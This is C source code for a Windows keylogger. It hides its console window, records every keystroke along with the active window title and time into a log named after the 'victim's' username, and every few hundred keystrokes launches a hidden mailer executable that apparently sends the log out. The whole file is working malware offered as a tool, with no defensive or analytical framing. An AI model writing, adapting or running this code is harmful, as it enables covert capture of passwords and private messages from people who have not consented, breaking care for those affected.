#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>
#include <process.h>

// GLOBALS
#define BUF_SIZE 256 // general purpose for buffers
int keystroke_count; // rough tracking for size of logfile

// FUNCTION DECLARATIONS //
char* GetTime();
void HideWindow();
void InitLogfile(char* filename);
void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_logfile);
void ExecuteMailer();
void KeystrokeHandler(short key, FILE* logfile);

// MAIN FUNCTION //
int main(){
    // avoid visible detection of executable window
    HideWindow();

    // initialize the current window
    char window[BUF_SIZE];
    char new_window[BUF_SIZE];
    HWND foreground = GetForegroundWindow();
    GetWindowText(foreground, window, BUF_SIZE);

    // initialize logfile and keystrokes
    char filename[BUF_SIZE];
    InitLogfile(filename);
    keystroke_count = 0;

    // active program process
    while(1){

        Sleep(10); // reduce CPU usage
        
        // loop thru keyboard characters
        for(short key = 8; key <= 222; key++){
            
            // check for key press
            // where -32767 means key is pressed
            if(GetAsyncKeyState(key) == -32767){

                // open keylog file then handle keystroke
                FILE* logfile;
                logfile = fopen(filename, "a");
                GetCurrentWindow(window, new_window, logfile, 0);
                KeystrokeHandler(key, logfile);
                keystroke_count++;
                fclose(logfile);

                // once logfile large enough, execute mailer
                if(keystroke_count >= 250){
                    //Execute mailer.py
                    ExecuteMailer();
                    keystroke_count = 0;
                    InitLogfile(filename);
                }
            }
        }
    }
    return 0;
}

// FUNCTION DEFINITIONS //

// get current time
char* GetTime(){
    time_t curr_time = time(NULL);
    return ctime(&curr_time);
}

// hides the executable window
void HideWindow(){
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0); // set to 0 to not display
}

// initialize logfile filename and header
void InitLogfile(char* filename){
    // develop filename based on victim's current user
    char username[BUF_SIZE+1];
    DWORD len = BUF_SIZE+1;
    GetUserName(username, &len);
    sprintf(filename, "%s_log.txt", username);

    // initialize logfile and window handle, then print to file
    FILE* logfile = fopen(filename, "w");
    char window[BUF_SIZE];
    HWND foreground = GetForegroundWindow();
    GetWindowText(foreground, window, BUF_SIZE);
    GetCurrentWindow(window, window, logfile, 1);
    fclose(logfile);
}

// get the current working window of the user
void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_logfile){
    HWND new_foreground = GetForegroundWindow();
    GetWindowText(new_foreground, window, BUF_SIZE);
    
    // display current window and time for clean logfile instance
    if(init_logfile == 1){
        fputs("BEGIN LOGGING...", logfile);
        fprintf(logfile, "\n\nWINDOW: %s\nTIME: %s", new_window, GetTime());
        fflush(logfile);
        return;
    }

    // check if window has changed/updated
    if(strcmp(window, new_window)){
        strncpy(new_window, window, BUF_SIZE);

        // if changed/updated, display current window and time
        if(!strcmp(window, new_window) && strcmp(window, "")){
            keystroke_count+=100; // account for avg length of header
            fprintf(logfile, "\n\nWINDOW: %s\nTIME: %s", new_window, GetTime());
            fflush(logfile);
        }
    }
}

// executes mailer module to send logfile
void ExecuteMailer(){
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // hide new executable window
    PROCESS_INFORMATION pi;
    
    // win32 version of fork() and exec()
    CreateProcess(
        "C:\\Users\\Logan\\Documents\\Programming\\Simple-Keylogger\\mailer.exe",
        NULL, NULL, NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );

    // wait for child process to complete to prevent emailing emptied logfile
    WaitForSingleObject(&pi, INFINITE);
    CloseHandle(&pi);
}
// writes to file the interpretation of keystroke
void KeystrokeHandler(short key, FILE* logfile){
    // upper case alphabet
    if( (key > 64 && key < 91) && GetAsyncKeyState(0x10)){
        fputc(key, logfile);
    }
    // lower case alphabet
    else if(key > 64 && key < 91){
        fputc(key+32, logfile);
    }
    // special characters, virtual keys, etc.
    else{
        switch(key){    
            case VK_SPACE: fputs("[SPACE]", logfile); break;
            case VK_TAB: fputs("[TAB]", logfile); break;
            case VK_BACK: fputs("[BACKSPACE]", logfile); break;
            case VK_RETURN: fputs("[ENTER]", logfile); break;
            case VK_SHIFT: fputs("[SHIFT]", logfile); break;
            case VK_CONTROL: fputs("[CTRL]", logfile); break;
            case VK_MENU: fputs("[ALT]", logfile); break;
            case VK_DELETE: fputs("[DEL]", logfile); break;
            case VK_ESCAPE: fputs("[ESC]", logfile); break;
            case VK_CAPITAL: fputs("[CAPS LOCK]", logfile); break;
            case VK_OEM_1: fputs("[;:]", logfile); break;
            case VK_OEM_2: fputs("[/?]", logfile); break;
            case VK_OEM_3: fputs("[`~]", logfile); break;
            case VK_OEM_4: fputs("[ [{ ]", logfile); break;
            case VK_OEM_5: fputs("[\\|]", logfile); break;
            case VK_OEM_6: fputs("[ ]} ]", logfile); break;
            case VK_OEM_7: fputs("['\"]", logfile); break;
            case 187: fputc('+', logfile); break;
            case 188: fputc(',', logfile); break;
            case 189: fputc('-', logfile); break;
            case 190: fputc('.', logfile); break;
            case VK_NUMPAD0: fputc('0', logfile); break;
            case VK_NUMPAD1: fputc('1', logfile); break;
            case VK_NUMPAD2: fputc('2', logfile); break;
            case VK_NUMPAD3: fputc('3', logfile); break;
            case VK_NUMPAD4: fputc('4', logfile); break;
            case VK_NUMPAD5: fputc('5', logfile); break;
            case VK_NUMPAD6: fputc('6', logfile); break;
            case VK_NUMPAD7: fputc('7', logfile); break;
            case VK_NUMPAD8: fputc('8', logfile); break;
            case VK_NUMPAD9: fputc('9', logfile); break;
            case 48:
                if(GetAsyncKeyState(0x10)){ fputc(')', logfile); }
                else{ fputc('0', logfile); }
                break;
            case 49:
                if(GetAsyncKeyState(0x10)){ fputc('!', logfile); }
                else{ fputc('1', logfile); }
                break;
            case 50:
                if(GetAsyncKeyState(0x10)){ fputc('@', logfile); }
                else{ fputc('2', logfile); }
                break;
            case 51:
                if(GetAsyncKeyState(0x10)){ fputc('#', logfile); }
                else{ fputc('3', logfile); }
                break;
            case 52:
                if(GetAsyncKeyState(0x10)){ fputc('$', logfile); }
                else{ fputc('4', logfile); }
                break;
            case 53:
                if(GetAsyncKeyState(0x10)){ fputc('%', logfile); }
                else{ fputc('5', logfile); }
                break;
            case 54:
                if(GetAsyncKeyState(0x10)){ fputc('^', logfile); }
                else{ fputc('6', logfile); }
                break;
            case 55:
                if(GetAsyncKeyState(0x10)){ fputc('&', logfile); }
                else{ fputc('7', logfile); }
                break;
            case 56:
                if(GetAsyncKeyState(0x10)){ fputc('*', logfile); }
                else{ fputc('8', logfile); }
                break;
            case 57:
                if(GetAsyncKeyState(0x10)){ fputc('(', logfile); }
                else{ fputc('9', logfile); }
                break;
        }
    }
}